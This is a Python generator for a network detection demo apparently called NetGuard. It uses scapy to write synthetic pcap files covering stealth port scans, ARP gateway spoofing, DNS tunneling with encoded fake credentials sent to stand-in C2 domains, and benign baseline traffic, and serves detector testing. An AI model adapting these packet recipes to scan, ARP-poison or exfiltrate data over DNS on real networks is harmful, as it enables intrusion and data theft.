"""Deterministic synthetic PCAP sample generator for NetGuard demonstrations."""

from __future__ import annotations

from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw
from scapy.utils import wrpcap

BASE_TIMESTAMP = 1700000000.0  # 2023-11-14T22:13:20Z


@dataclass(frozen=True)
class SampleMetadata:
    """Catalog metadata describing a built-in demonstration capture."""

    sample_id: str
    filename: str
    title: str
    category: str
    description: str
    expected_threats: list[str]
    demo_tip: str

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


SAMPLE_CATALOG: list[SampleMetadata] = [
    SampleMetadata(
        sample_id="01_stealth_port_scans",
        filename="01_stealth_port_scans.pcap",
        title="01 — Stealth & Half-Open Port Scans",
        category="Reconnaissance (T1046)",
        description=(
            "Combines completed 3-way TCP handshakes and single-port SYN retransmissions "
            "(zero false positives) with half-open SYN, FIN, NULL, and Xmas stealth scans."
        ),
        expected_threats=["TCP_SYN_SCAN", "TCP_FIN_SCAN", "TCP_NULL_SCAN", "TCP_XMAS_SCAN"],
        demo_tip="Notice how 16 completed handshakes and 18 retries to :443 stay quiet while all 4 scan types fire.",
    ),
    SampleMetadata(
        sample_id="02_dns_tunneling",
        filename="02_dns_tunneling.pcap",
        title="02 — DNS Tunneling & TXT Exfiltration",
        category="C2 & Exfiltration (T1071.004 / T1048.003)",
        description=(
            "Mixes legitimate corporate DNS, PTR reverse lookups, and _dmarc/_acme-challenge records "
            "with high-entropy Base64 A queries, oversized TXT tunnels, and long chained subdomains."
        ),
        expected_threats=["DNS_HIGH_ENTROPY", "DNS_TXT_TUNNELING", "DNS_LONG_SUBDOMAIN"],
        demo_tip="Open Forensic Telemetry to inspect the Shannon Entropy vs Subdomain Length scatter plot.",
    ),
    SampleMetadata(
        sample_id="03_arp_spoofing",
        filename="03_arp_spoofing.pcap",
        title="03 — ARP Cache Poisoning & MITM",
        category="Credential Access / MITM (T1557.002)",
        description=(
            "Establishes benign RFC 5227 DAD probes (0.0.0.0) and normal gateway ARP bindings, "
            "followed by gratuitous ARP spoofing and an Ethernet-vs-ARP sender MAC mismatch."
        ),
        expected_threats=["ARP_IP_MAC_CONFLICT", "ARP_HEADER_MISMATCH"],
        demo_tip="Check the ARP Binding Table to see conflicting MACs flagged without losing original ground truth.",
    ),
    SampleMetadata(
        sample_id="04_full_killchain_demo",
        filename="04_full_killchain_demo.pcap",
        title="04 — Full Multi-Stage SOC Kill Chain",
        category="Full Incident Scenario",
        description=(
            "End-to-end SOC replay combining normal LAN baseline traffic, external SYN & Xmas scans, "
            "internal gateway ARP poisoning, and DNS C2/TXT data exfiltration."
        ),
        expected_threats=[
            "TCP_SYN_SCAN",
            "TCP_XMAS_SCAN",
            "ARP_IP_MAC_CONFLICT",
            "DNS_HIGH_ENTROPY",
            "DNS_TXT_TUNNELING",
        ],
        demo_tip="Enable nftables quarantine dry-run to preview automated firewall drops for the threat actors.",
    ),
    SampleMetadata(
        sample_id="05_benign_baseline",
        filename="05_benign_baseline.pcap",
        title="05 — Clean Benign Baseline (Zero Alerts)",
        category="False-Positive Verification",
        description=(
            "Clean enterprise traffic: completed TCP sessions across 20 ports, single-port SYN retries, "
            "standard DNS (_dmarc, PTR, A/AAAA/MX), RFC 5227 probes, ICMP, and IPv6 traffic."
        ),
        expected_threats=[],
        demo_tip="Verifies zero false positives across all three detectors under default thresholds.",
    ),
    SampleMetadata(
        sample_id="06_edge_cases_stress",
        filename="06_edge_cases_stress.pcap",
        title="06 — Edge Cases & Threshold Tuning Lab",
        category="Resilience & Tuning",
        description=(
            "Includes a slow scan (16 ports over 45s), IPv6 SYN scan, loopback FIN scan (tests "
            "allowlist protection), ECN-flagged TCP handshake, and malformed non-UTF8 DNS bytes."
        ),
        expected_threats=["TCP_SYN_SCAN (IPv6)", "TCP_FIN_SCAN (127.0.0.1)"],
        demo_tip="Try changing Scan Window from 10s to 60s and re-running to catch the slow 192.0.2.77 scan!",
    ),
]


def _ts(pkt: Any, offset: float) -> Any:
    pkt.time = BASE_TIMESTAMP + offset
    return pkt


def _tcp_handshake(
    client_ip: str,
    server_ip: str,
    client_mac: str,
    server_mac: str,
    sport: int,
    dport: int,
    offset: float,
    syn_flags: str = "S",
) -> list[Any]:
    return [
        _ts(
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / TCP(sport=sport, dport=dport, flags=syn_flags, seq=1000),
            offset,
        ),
        _ts(
            Ether(src=server_mac, dst=client_mac)
            / IP(src=server_ip, dst=client_ip)
            / TCP(sport=dport, dport=sport, flags="SA", seq=2000, ack=1001),
            offset + 0.01,
        ),
        _ts(
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / TCP(sport=sport, dport=dport, flags="A", seq=1001, ack=2001),
            offset + 0.02,
        ),
        _ts(
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / TCP(sport=sport, dport=dport, flags="PA", seq=1001, ack=2001)
            / Raw(b"GET / HTTP/1.1\r\nHost: internal\r\n\r\n"),
            offset + 0.03,
        ),
    ]


def _dns_query(
    src_ip: str,
    dst_ip: str,
    src_mac: str,
    dst_mac: str,
    qname: str,
    qtype: str,
    offset: float,
    sport: int = 53000,
) -> Any:
    return _ts(
        Ether(src=src_mac, dst=dst_mac)
        / IP(src=src_ip, dst=dst_ip)
        / UDP(sport=sport, dport=53)
        / DNS(rd=1, qr=0, qd=DNSQR(qname=qname, qtype=qtype)),
        offset,
    )


def _build_stealth_port_scans() -> list[Any]:
    pkts: list[Any] = []
    victim = "192.168.10.10"
    victim_mac = "00:11:22:33:44:10"

    # 16 completed handshakes across 16 distinct ports (must NOT alert)
    benign_ports = [22, 80, 443, 445, 3306, 5432, 6379, 8000, 8080, 8443, 9000, 9090, 9200, 27017, 5000, 3000]
    for idx, port in enumerate(benign_ports):
        pkts.extend(
            _tcp_handshake(
                "192.168.10.25",
                victim,
                "00:11:22:33:44:25",
                victim_mac,
                40000 + idx,
                port,
                offset=0.1 * idx,
            )
        )

    # 18 retransmitted SYNs to the exact same port 443 (must NOT alert)
    for idx in range(18):
        pkts.append(
            _ts(
                Ether(src="00:11:22:33:44:30", dst=victim_mac)
                / IP(src="192.168.10.30", dst=victim)
                / TCP(sport=45000 + idx, dport=443, flags="S"),
                2.0 + 0.05 * idx,
            )
        )

    # Half-open SYN scan across 25 ports from 203.0.113.45
    syn_ports = [
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993,
        995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 27017,
    ]
    for idx, port in enumerate(syn_ports):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:01:45", dst=victim_mac)
                / IP(src="203.0.113.45", dst=victim)
                / TCP(sport=51000 + idx, dport=port, flags="S"),
                4.0 + 0.1 * idx,
            )
        )

    # Stealth FIN scan across 10 ports from 198.51.100.77
    for idx in range(10):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:02:77", dst=victim_mac)
                / IP(src="198.51.100.77", dst=victim)
                / TCP(sport=52000 + idx, dport=20 + idx, flags="F"),
                8.0 + 0.1 * idx,
            )
        )

    # Stealth NULL scan across 10 ports from 198.51.100.88
    for idx in range(10):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:03:88", dst=victim_mac)
                / IP(src="198.51.100.88", dst=victim)
                / TCP(sport=53000 + idx, dport=100 + idx, flags=0),
                10.0 + 0.1 * idx,
            )
        )

    # Stealth Xmas scan (FIN|PSH|URG) across 10 ports from 198.51.100.99
    for idx in range(10):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:04:99", dst=victim_mac)
                / IP(src="198.51.100.99", dst=victim)
                / TCP(sport=54000 + idx, dport=200 + idx, flags="FPU"),
                12.0 + 0.1 * idx,
            )
        )

    return pkts


def _build_dns_tunneling() -> list[Any]:
    pkts: list[Any] = []
    dns_srv = "192.168.10.2"
    dns_mac = "aa:bb:cc:00:00:02"
    client_ip = "192.168.10.25"
    client_mac = "00:11:22:33:44:25"
    compromised_ip = "192.168.10.66"
    compromised_mac = "00:11:22:33:44:66"

    benign_queries = [
        ("www.google.com", "A"),
        ("api.github.com", "A"),
        ("cdn.cloudflare.net", "AAAA"),
        ("mail.example.co.uk", "MX"),
        ("10.10.168.192.in-addr.arpa", "PTR"),
        ("_dmarc.example.com", "TXT"),
        ("_acme-challenge.portal.example.com", "TXT"),
    ]
    for idx, (qname, qtype) in enumerate(benign_queries):
        pkts.append(
            _dns_query(client_ip, dns_srv, client_mac, dns_mac, qname, qtype, 0.2 * idx, 51000 + idx)
        )

    # High-entropy Base64-like A query (>3.8 Shannon entropy, >=20 chars)
    pkts.append(
        _dns_query(
            compromised_ip,
            dns_srv,
            compromised_mac,
            dns_mac,
            "aG9zdD1kYjAxJnVzZXI9YWRtaW4mc2VxPTA0.c2-beacon.evil.test",
            "A",
            2.0,
            52001,
        )
    )
    pkts.append(
        _dns_query(
            compromised_ip,
            dns_srv,
            compromised_mac,
            dns_mac,
            "9Kx2Lm8Qp4Zr7Wv1Yt5Bn3Cd6Fg0Hj9Mk4Pq.c2-beacon.evil.test",
            "A",
            2.4,
            52002,
        )
    )

    # Oversized high-entropy TXT tunneling queries
    pkts.append(
        _dns_query(
            compromised_ip,
            dns_srv,
            compromised_mac,
            dns_mac,
            "ZXhmaWwtY2h1bmstMDAxLWtleS1hOWI4Yzd2NmU1cjR0M3kyLmpz.exfil.evil.test",
            "TXT",
            3.5,
            52003,
        )
    )
    pkts.append(
        _dns_query(
            compromised_ip,
            dns_srv,
            compromised_mac,
            dns_mac,
            "MHg4ZjNhOWIyYzdkNGU1ZjZhMWI4YzlkMGU3ZjZhNWI0YzNkMmU.exfil.evil.test",
            "TXT",
            4.1,
            52004,
        )
    )

    # Long low-entropy subdomain query (>50 chars, entropy < 3.8)
    pkts.append(
        _dns_query(
            "192.168.10.67",
            dns_srv,
            "00:11:22:33:44:67",
            dns_mac,
            "a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1.tunnel.evil.test",
            "A",
            5.0,
            52005,
        )
    )

    return pkts


def _build_arp_spoofing() -> list[Any]:
    pkts: list[Any] = []
    gw_ip = "192.168.10.1"
    gw_mac = "aa:bb:cc:00:00:01"
    attacker_mac = "de:ad:be:ef:13:37"

    # Benign RFC 5227 Duplicate Address Detection probes (0.0.0.0 -> must NOT alert)
    pkts.append(
        _ts(
            Ether(src="00:11:22:33:44:50", dst="ff:ff:ff:ff:ff:ff")
            / ARP(op=1, psrc="0.0.0.0", pdst="192.168.10.50", hwsrc="00:11:22:33:44:50", hwdst="00:00:00:00:00:00"),
            0.1,
        )
    )

    # Baseline LAN ARP traffic
    for idx in range(3):
        pkts.append(
            _ts(
                Ether(src=gw_mac, dst="00:11:22:33:44:25")
                / ARP(op=2, psrc=gw_ip, pdst="192.168.10.25", hwsrc=gw_mac, hwdst="00:11:22:33:44:25"),
                0.5 + 0.5 * idx,
            )
        )
    pkts.append(
        _ts(
            Ether(src="aa:bb:cc:00:00:02", dst="ff:ff:ff:ff:ff:ff")
            / ARP(op=1, psrc="192.168.10.2", pdst="192.168.10.25", hwsrc="aa:bb:cc:00:00:02", hwdst="00:00:00:00:00:00"),
            2.0,
        )
    )
    pkts.append(
        _ts(
            Ether(src="00:11:22:33:44:25", dst="aa:bb:cc:00:00:02")
            / ARP(op=2, psrc="192.168.10.25", pdst="192.168.10.2", hwsrc="00:11:22:33:44:25", hwdst="aa:bb:cc:00:00:02"),
            2.1,
        )
    )

    # Spoofed gratuitous ARP replies flipping gateway MAC
    for idx in range(3):
        pkts.append(
            _ts(
                Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
                / ARP(op=2, psrc=gw_ip, pdst=gw_ip, hwsrc=attacker_mac, hwdst="ff:ff:ff:ff:ff:ff"),
                4.0 + 0.3 * idx,
            )
        )

    # Forged ARP frame with L2 Ethernet src != ARP hwsrc header mismatch
    pkts.append(
        _ts(
            Ether(src=attacker_mac, dst="00:11:22:33:44:25")
            / ARP(op=2, psrc="192.168.10.2", pdst="192.168.10.25", hwsrc="aa:bb:cc:00:00:02", hwdst="00:11:22:33:44:25"),
            6.0,
        )
    )

    return pkts


def _build_full_killchain_demo() -> list[Any]:
    pkts: list[Any] = []
    srv_ip = "192.168.10.10"
    srv_mac = "00:11:22:33:44:10"
    gw_ip = "192.168.10.1"
    gw_mac = "aa:bb:cc:00:00:01"
    dns_ip = "192.168.10.2"
    dns_mac = "aa:bb:cc:00:00:02"

    # Stage 0: Benign baseline (ARP + DNS + completed HTTPS session)
    pkts.append(
        _ts(
            Ether(src=gw_mac, dst="ff:ff:ff:ff:ff:ff")
            / ARP(op=2, psrc=gw_ip, pdst="192.168.10.20", hwsrc=gw_mac, hwdst="00:11:22:33:44:20"),
            0.2,
        )
    )
    pkts.append(
        _dns_query("192.168.10.20", dns_ip, "00:11:22:33:44:20", dns_mac, "portal.company.internal", "A", 0.5, 51001)
    )
    pkts.extend(
        _tcp_handshake("192.168.10.20", srv_ip, "00:11:22:33:44:20", srv_mac, 41000, 443, offset=1.0)
    )

    # Stage 1: External SYN scan (20 ports) from 203.0.113.99
    for idx in range(20):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:05:99", dst=srv_mac)
                / IP(src="203.0.113.99", dst=srv_ip)
                / TCP(sport=60000 + idx, dport=20 + idx * 5, flags="S"),
                3.0 + 0.1 * idx,
            )
        )

    # Stage 2: External Xmas stealth scan (8 ports) from 198.51.100.55
    for idx in range(8):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:06:55", dst=srv_mac)
                / IP(src="198.51.100.55", dst=srv_ip)
                / TCP(sport=61000 + idx, dport=440 + idx, flags="FPU"),
                7.0 + 0.1 * idx,
            )
        )

    # Stage 3: Internal gateway ARP spoofing by rogue host
    rogue_mac = "de:ad:be:ef:ca:fe"
    pkts.append(
        _ts(
            Ether(src=rogue_mac, dst="ff:ff:ff:ff:ff:ff")
            / ARP(op=2, psrc=gw_ip, pdst=gw_ip, hwsrc=rogue_mac, hwdst="ff:ff:ff:ff:ff:ff"),
            10.0,
        )
    )

    # Stage 4: Data exfiltration via DNS high-entropy A & TXT tunneling from 192.168.10.50
    pkts.append(
        _dns_query(
            "192.168.10.50",
            dns_ip,
            "00:11:22:33:44:50",
            dns_mac,
            "dXNlcm5hbWU9YWRtaW4mc2VjcmV0PWtleTkwODc2.exfil.attacker-c2.example",
            "A",
            13.0,
            52010,
        )
    )
    pkts.append(
        _dns_query(
            "192.168.10.50",
            dns_ip,
            "00:11:22:33:44:50",
            dns_mac,
            "eyJzZWNyZXQiOiJBSXpUOXFCN2s0TDJtOFhwMVFyM1p0NVZ3In0.exfil.attacker-c2.example",
            "TXT",
            14.2,
            52011,
        )
    )

    return pkts


def _build_benign_baseline() -> list[Any]:
    pkts: list[Any] = []
    srv_ip = "192.168.10.10"
    srv_mac = "00:11:22:33:44:10"
    cli_ip = "192.168.10.20"
    cli_mac = "00:11:22:33:44:20"
    dns_ip = "192.168.10.2"
    dns_mac = "aa:bb:cc:00:00:02"

    # 20 completed TCP handshakes + FIN+ACK teardown (tests half-open exclusion)
    for idx in range(20):
        dport = 8000 + idx
        off = 0.2 * idx
        pkts.extend(_tcp_handshake(cli_ip, srv_ip, cli_mac, srv_mac, 42000 + idx, dport, offset=off))
        pkts.append(
            _ts(
                Ether(src=cli_mac, dst=srv_mac)
                / IP(src=cli_ip, dst=srv_ip)
                / TCP(sport=42000 + idx, dport=dport, flags="FA", seq=1040, ack=2001),
                off + 0.05,
            )
        )

    # 12 normal SYN retries to single port 443
    for idx in range(12):
        pkts.append(
            _ts(
                Ether(src="00:11:22:33:44:21", dst=srv_mac)
                / IP(src="192.168.10.21", dst=srv_ip)
                / TCP(sport=43000 + idx, dport=443, flags="S"),
                5.0 + 0.1 * idx,
            )
        )

    # Standard DNS + allowlisted PTR / _dmarc / .local + DNS response (qr=1)
    for idx, (qname, qtype) in enumerate([
        ("docs.python.org", "A"),
        ("pypi.org", "AAAA"),
        ("example.com", "MX"),
        ("20.10.168.192.in-addr.arpa", "PTR"),
        ("_dmarc.company.com", "TXT"),
        ("_spf.company.com", "TXT"),
        ("printer-lobby.local", "A"),
    ]):
        pkts.append(_dns_query(cli_ip, dns_ip, cli_mac, dns_mac, qname, qtype, 7.0 + 0.2 * idx, 53000 + idx))

    pkts.append(
        _ts(
            Ether(src=dns_mac, dst=cli_mac)
            / IP(src=dns_ip, dst=cli_ip)
            / UDP(sport=53, dport=53000)
            / DNS(qr=1, rd=1, ra=1, qd=DNSQR(qname="docs.python.org", qtype="A")),
            7.05,
        )
    )

    # Stable ARP + RFC 5227 probe
    pkts.append(
        _ts(
            Ether(src=cli_mac, dst="ff:ff:ff:ff:ff:ff")
            / ARP(op=1, psrc="0.0.0.0", pdst=cli_ip, hwsrc=cli_mac, hwdst="00:00:00:00:00:00"),
            9.0,
        )
    )
    for idx in range(3):
        pkts.append(
            _ts(
                Ether(src="aa:bb:cc:00:00:01", dst=cli_mac)
                / ARP(op=2, psrc="192.168.10.1", pdst=cli_ip, hwsrc="aa:bb:cc:00:00:01", hwdst=cli_mac),
                9.2 + 0.2 * idx,
            )
        )

    # Benign ICMP + IPv6 DNS
    pkts.append(
        _ts(
            Ether(src=cli_mac, dst="aa:bb:cc:00:00:01")
            / IP(src=cli_ip, dst="8.8.8.8")
            / ICMP(type=8, code=0),
            10.0,
        )
    )
    pkts.append(
        _ts(
            Ether(src=cli_mac, dst=dns_mac)
            / IPv6(src="2001:db8:cafe::20", dst="2001:db8:cafe::2")
            / UDP(sport=54000, dport=53)
            / DNS(rd=1, qr=0, qd=DNSQR(qname="ipv6.google.com", qtype="AAAA")),
            10.2,
        )
    )

    return pkts


def _build_edge_cases_stress() -> list[Any]:
    pkts: list[Any] = []
    victim = "192.168.10.10"
    victim_mac = "00:11:22:33:44:10"

    # 1. Slow scan: 16 ports spaced 3.0s apart (45s span -> misses 10s window, caught at 60s!)
    for idx in range(16):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:07:77", dst=victim_mac)
                / IP(src="192.0.2.77", dst=victim)
                / TCP(sport=46000 + idx, dport=1000 + idx, flags="S"),
                3.0 * idx,
            )
        )

    # 2. TCP ECN-capable completed handshake (SYN|ECE|CWR = "SEC") -> must NOT alert
    pkts.extend(
        _tcp_handshake(
            "192.168.10.40",
            victim,
            "00:11:22:33:44:40",
            victim_mac,
            47000,
            443,
            offset=5.0,
            syn_flags="SEC",
        )
    )

    # 3. IPv6 half-open SYN scan (16 ports in 1.6s) -> triggers TCP_SYN_SCAN
    for idx in range(16):
        pkts.append(
            _ts(
                Ether(src="aa:00:00:00:08:42", dst=victim_mac)
                / IPv6(src="2001:db8:dead::42", dst="2001:db8:cafe::10")
                / TCP(sport=48000 + idx, dport=2000 + idx, flags="S"),
                6.0 + 0.1 * idx,
            )
        )

    # 4. Loopback FIN scan (6 ports) -> triggers TCP_FIN_SCAN & tests allowlist protection
    for idx in range(6):
        pkts.append(
            _ts(
                Ether(src="00:00:00:00:00:01", dst="00:00:00:00:00:01")
                / IP(src="127.0.0.1", dst="127.0.0.1")
                / TCP(sport=49000 + idx, dport=300 + idx, flags="F"),
                10.0 + 0.1 * idx,
            )
        )

    # 5. Malformed non-UTF8 / truncated DNS payload (must never crash analyzer)
    pkts.append(
        _ts(
            Ether(src="00:11:22:33:44:40", dst="aa:bb:cc:00:00:02")
            / IP(src="192.168.10.40", dst="192.168.10.2")
            / UDP(sport=55555, dport=53)
            / Raw(b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04\xff\xfe\xfd\xfc\x04evil\x04test\x00\x00\x01\x00\x01"),
            12.0,
        )
    )

    return pkts


def generate_all_samples(output_dir: str | Path) -> list[Path]:
    """Write all 6 deterministic sample .pcap files to output_dir and return their paths."""
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    builders = {
        "01_stealth_port_scans.pcap": _build_stealth_port_scans,
        "02_dns_tunneling.pcap": _build_dns_tunneling,
        "03_arp_spoofing.pcap": _build_arp_spoofing,
        "04_full_killchain_demo.pcap": _build_full_killchain_demo,
        "05_benign_baseline.pcap": _build_benign_baseline,
        "06_edge_cases_stress.pcap": _build_edge_cases_stress,
    }

    written: list[Path] = []
    for filename, builder in builders.items():
        target = out_dir / filename
        packets = builder()
        wrpcap(str(target), packets)
        written.append(target)
    return written
